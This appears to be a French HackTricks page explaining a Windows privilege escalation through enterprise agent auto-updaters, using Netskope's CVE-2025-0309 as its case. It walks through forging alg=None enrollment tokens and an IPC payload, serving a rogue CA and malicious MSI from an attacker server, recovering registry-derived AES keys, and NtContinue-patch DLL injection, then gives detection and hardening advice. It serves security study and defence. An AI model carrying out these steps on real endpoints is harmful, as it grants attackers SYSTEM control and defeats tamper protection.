# Abuser les Auto-Updaters d'entreprise et l'IPC privilégié (p. ex., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une classe de chaînes d'escalade de privilèges locales Windows trouvées dans les agents endpoint d'entreprise et les updaters qui exposent une surface IPC peu contraignante et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur peu privilégié peut forcer l'inscription sur un serveur contrôlé par l'attaquant puis fournir un MSI malveillant que le service SYSTEM installe.

Idées clés réutilisables contre des produits similaires :
- Abuser de l'IPC localhost d'un service privilégié pour forcer la ré‑inscription ou la reconfiguration vers un serveur de l'attaquant.
- Implémenter les update endpoints du vendor, livrer un Trusted Root CA rogue, et pointer l'updater vers un package malveillant « signé ».
- Éviter les vérifications faibles du signer (CN allow‑lists), les flags digest optionnels, et les propriétés MSI laxistes.
- Si l'IPC est « encrypted », dériver la key/IV à partir d'identifiants machine lisibles par tous stockés dans le registry.
- Si le service restreint les appelants par image path/process name, injecter dans un processus allow‑listé ou en lancer un suspendu et bootstrapper votre DLL via un patch minimal du thread‑context.

---
## 1) Forcer l'inscription vers un serveur contrôlé par l'attaquant via l'IPC localhost

De nombreux agents incluent un processus UI en mode utilisateur qui communique avec un service SYSTEM via TCP localhost en utilisant JSON.

Observé chez Netskope :
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flux d'exploitation :
1) Craft a JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Le service commence à contacter votre serveur malveillant pour l'enrôlement/la configuration, p. ex. :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Remarques :
- Si la vérification de l'appelant est basée sur le chemin/nom, faites provenir la requête d'un vendor binary allow‑listed (voir §4).

---
## 2) Détourner le canal de mise à jour pour exécuter du code en tant que SYSTEM

Une fois que le client communique avec votre serveur, implémentez les endpoints attendus et orientez-le vers un attacker MSI. Séquence typique :

1) /v2/config/org/clientconfig → Retourner la configuration JSON avec un intervalle de mise à jour très court, p. ex. :
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA au format PEM. Le service l'installe dans le magasin Trusted Root de Local Machine.
3) /v2/checkupdate → Fournit des métadonnées pointant vers un MSI malveillant et une version factice.

Bypass des vérifications courantes observées en pratique :
- Signer CN allow‑list : le service peut se contenter de vérifier que le Subject CN est “netSkope Inc” ou “Netskope, Inc.”. Votre CA malveillante peut émettre un certificat leaf avec ce CN et signer le MSI.
- CERT_DIGEST property : inclure une propriété MSI bénigne nommée CERT_DIGEST. Aucune application de cette valeur à l'installation.
- Optional digest enforcement : un flag de config (par ex., check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Résultat : le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
et exécute du code arbitraire en tant que NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Depuis R127, Netskope encapsulait le JSON IPC dans un champ encryptData qui ressemble à du Base64. Le reverse engineering a montré un AES avec key/IV dérivés de valeurs de registre lisibles par n’importe quel utilisateur :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attaquants peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un utilisateur standard. Astuce générale : si un agent "chiffre" soudainement son IPC, cherchez des device IDs, product GUIDs, install IDs sous HKLM comme matériau.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Certains services tentent d'authentifier le pair en résolvant le PID de la connexion TCP et en comparant le chemin/nom de l'image avec des binaires vendor allow‑listés situés sous Program Files (par ex., stagentui.exe, bwansvc.exe, epdlp.exe).

Deux contournements pratiques :
- DLL injection dans un processus allow‑listé (par ex., nsdiag.exe) et proxy de l'IPC depuis l'intérieur.
- Lancer un binaire allow‑listé en suspended et bootstrapper votre DLL proxy sans CreateRemoteThread (voir §5) pour satisfaire les règles anti‑tamper appliquées par le driver.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Les produits fournissent souvent un minifilter / OB callbacks driver (par ex., Stadrv) pour retirer des droits dangereux des handles vers les processus protégés :
- Process : supprime PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread : limite à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user‑mode fiable qui respecte ces contraintes :
1) CreateProcess d'un binaire vendor avec CREATE_SUSPENDED.
2) Obtenir les handles encore autorisés : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le process, et un handle de thread avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou juste THREAD_RESUME si vous patcher du code à un RIP connu).
3) Écraser ntdll!NtContinue (ou un autre thunk précoce garanti mappé) par un petit stub qui appelle LoadLibraryW sur le chemin de votre DLL, puis saute en arrière.
4) ResumeThread pour déclencher votre stub in‑process et charger votre DLL.

Parce que vous n'avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un process déjà‑protégé (vous l'avez créé), la politique du driver est satisfaite.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatise une CA malveillante, la signature d’un MSI malveillant, et fournit les endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope est un client IPC personnalisé qui fabrique des messages IPC arbitraires (optionnellement AES‑chiffrés) et inclut l'injection via processus suspendu pour émaner d'un binaire allow‑listé.

---
## 7) Detection opportunities (blue team)
- Surveiller les ajouts au Local Machine Trusted Root. Sysmon + registry‑mod eventing (voir les recommandations SpecterOps) fonctionne bien.
- Signaler les exécutions de MSI initiées par le service de l'agent depuis des chemins comme C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Examiner les logs de l'agent pour des hosts/tenants d'enrôlement inattendus, ex. : C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – rechercher des anomalies addonUrl / tenant et provisioning msg 148.
- Alerter sur les clients IPC localhost qui ne sont pas les binaires signés attendus, ou qui proviennent d'arbres de processus enfants inhabituels.

---
## Hardening tips for vendors
- Lier les hosts d'enrôlement/update à une allow‑list stricte ; rejeter les domaines non fiables dans clientcode.
- Authentifier les peers IPC avec des primitives OS (ALPC security, named‑pipe SIDs) plutôt qu'avec des vérifications de chemin/nom d'image.
- Garder le matériel secret hors de HKLM lisible par tous ; si l'IPC doit être chiffré, dériver les clés depuis des secrets protégés ou négocier sur des canaux authentifiés.
- Traiter l'updater comme une surface de la supply‑chain : exiger une chaîne complète vers une CA de confiance que vous contrôlez, vérifier les signatures des packages contre des clés épinglées, et échouer fermé si la validation est désactivée dans la config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
